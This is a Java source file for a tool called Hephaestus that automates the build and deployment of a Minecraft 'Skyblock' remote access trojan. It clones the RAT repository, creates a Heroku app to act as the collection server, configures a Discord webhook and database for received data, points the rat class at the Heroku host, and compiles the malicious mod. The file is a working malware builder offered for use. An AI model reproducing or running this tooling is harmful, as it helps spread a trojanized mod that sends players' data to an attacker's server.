package studio.dreamys;

import org.apache.commons.io.FileUtils;
import org.eclipse.jgit.api.Git;
import org.gradle.tooling.GradleConnector;
import org.gradle.tooling.ProjectConnection;

import java.io.File;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Scanner;

public class Tasks {
    public static File path = new File(System.getenv("APPDATA") + "\\Hephaestus");
    public static Path ratPath = Paths.get(path + "\\src\\main\\java\\studio\\dreamys\\Rat.java");
    public static Path serverPath = Paths.get(path + "\\server\\app.js");

    public static Scanner sc = new Scanner(System.in);
    public static String appName;

    public static void fullSetup() {
        separator();
        cloneMainRepo();
        separator();
        //server
        initializeServerRepo();
        separator();
        createHerokuApp();
        separator();
        changeConfigVars();
        separator();
        deployHerokuApp();
        separator();
        //mod
        setupDecompWorkspace();
        separator();
        changeModServerURL();
        separator();
        build();
        separator();
        killDaemons();
        //extra
    }

    public static void cloneMainRepo() {
        try {
            if (!path.exists()) {
                log("Repository not found. Cloning repository... [1/9]");

                Git.cloneRepository().setURI("https://github.com/123Lucaman/Skyblock-Rat.git").setDirectory(path).call();

                log("Repository cloned successfully. [1/9]");
            } else {
                log("Repository already exists. Skipping cloning. [1/9]");
            }
        } catch (Exception e) {
            log("Error while cloning main repository. [1/9]");
            e.printStackTrace();
            System.exit(-1);
        }
    }

    public static void initializeServerRepo() {
        try {
            log("Initializing server repository... [2/9]");

            Git.init().setDirectory(new File(path + "\\server")).call();

            log("Server repository initialized successfully. [2/9]");
        } catch (Exception e) {
            log("Error while initializing server git repository. [2/9]");
            e.printStackTrace();
            System.exit(-2);
        }
    }

    public static void createHerokuApp() {
        try {
            log("Please enter the desired name for the app: [3/9]");
            appName = sc.nextLine();

            log("Creating heroku app... [3/9]");

            Process p = Runtime.getRuntime().exec("heroku.cmd create " + appName, null, new File(path + "\\server"));
            p.waitFor();

            log("Heroku app created successfully. [3/9]");
        } catch (Exception e) {
            log("Error while creating heroku app. [3/9]");
            e.printStackTrace();
            System.exit(-3);
        }
    }

    public static void changeConfigVars() {
        try {
            log("Please enter the discord WEBHOOK url: (leave it empty if you're not using it) [4/9]");
            String webhookUrl = sc.nextLine();
            if (webhookUrl.equals("")) {
                replaceInFile(serverPath, "usingDiscord = true", "usingDiscord = false");
            }

            log("Please enter the database DB url: (leave it empty if you're not using it) [4/9]");
            String dbUrl = sc.nextLine();
            if (dbUrl.equals("")) {
                replaceInFile(serverPath, "usingMongoDB = true", "usingMongoDB = false");
            }

            log("Changing config vars... [4/9]");

            Process p = Runtime.getRuntime().exec("heroku.cmd config:set WEBHOOK=" + webhookUrl, null, new File(path + "\\server"));
            p.waitFor();
            Process p2 = Runtime.getRuntime().exec("heroku.cmd config:set DB=" + dbUrl, null, new File(path + "\\server"));
            p2.waitFor();

            log("Config vars changed successfully. [4/9]");
        } catch (Exception e) {
            log("Error while changing config vars. [4/9]");
            e.printStackTrace();
            System.exit(-4);
        }
    }

    public static void deployHerokuApp() {
        try {
            log("Deploying heroku app... [5/9]");

            Git.open(new File(path + "\\server")).add().addFilepattern(".").call();
            Git.open(new File(path + "\\server")).commit().setMessage("Hephaestus Autocommit").call();
//            Git.open(new File(path + "\\server")).push().setRemote("heroku").call(); //TODO: find out why this doesn't work but the one below does
            Process p = Runtime.getRuntime().exec("git push heroku master", null, new File(path + "\\server"));
            p.waitFor();

            log("Heroku app deployed successfully. [5/9]");
        } catch (Exception e) {
            log("Error while deploying heroku app. [5/9]");
            e.printStackTrace();
            System.exit(-5);
        }
    }

    public static void setupDecompWorkspace() {
        try {
            log("Running setupDecompWorkspace... [6/9]");

            ProjectConnection connection = GradleConnector.newConnector().forProjectDirectory(path).useDistribution(new URI("https://services.gradle.org/distributions/gradle-3.1-bin.zip")).connect();
            connection.newBuild().forTasks("setupDecompWorkspace").run();
            connection.close();

            log("SetupDecompWorkspace finished successfully. [6/9]");
        } catch (Exception e) {
            log("Error while running setupDecompWorkspace. [6/9]");
            e.printStackTrace();
            System.exit(-6);
        }
    }

    public static void changeModServerURL() {
        try {
            log("Modifying rat class... [7/9]");

            replaceInFile(ratPath, "http://localhost:80/", "https://" + appName + ".herokuapp.com");

            log("Modified rat class successfully. [7/9]");
        } catch (Exception e) {
            log("Error while modifying rat class. [7/9]");
            e.printStackTrace();
            System.exit(-7);
        }
    }

    public static void build() {
        try {
            log("Building mod... [8/9]");

            ProjectConnection connection = GradleConnector.newConnector().forProjectDirectory(path).useDistribution(new URI("https://services.gradle.org/distributions/gradle-3.1-bin.zip")).connect();
            connection.newBuild().forTasks("build").run();
            connection.close();

            log("Build finished successfully. [8/9]");
        } catch (Exception e) {
            log("Error while building R.A.T mod. [8/9]");
            e.printStackTrace();
            System.exit(-8);
        }
    }

    public static void killDaemons() {
        try {
            log("Killing daemons... [9/9]");

            Process p = Runtime.getRuntime().exec(path + "\\gradlew.bat --stop");
            p.waitFor();

            log("Daemons killed successfully. [9/9]");
        } catch (Exception e) {
            log("Error while clearing cache. [9/9]");
            e.printStackTrace();
            System.exit(-9);
        }
    }

    public static void clearCache() {
        try {
            killDaemons();
            log("Clearing cache... [10/10]");

            FileUtils.forceDelete(path);

            log("Daemons cleared successfully. [10/10]");
        } catch (Exception e) {
            log("Error while clearing cache. [10/10]");
            e.printStackTrace();
            System.exit(-10);
        }
    }

    public static void replaceInFile(Path path, String find, String replace) {
        try {
            String content = new String(Files.readAllBytes(path), StandardCharsets.UTF_8);
            content = content.replaceAll(find, replace);
            Files.write(path, content.getBytes(StandardCharsets.UTF_8));
        } catch (Exception e) {
            log("Error while replacing in file.");
            e.printStackTrace();
            System.exit(-11);
        }
    }

    public static void log(String message) {
        System.out.println("[Hephaestus] " + message);
    }

    public static void separator() {
        System.out.println("--------------------------------------------------------------------------------------------------------------------");
    }
}
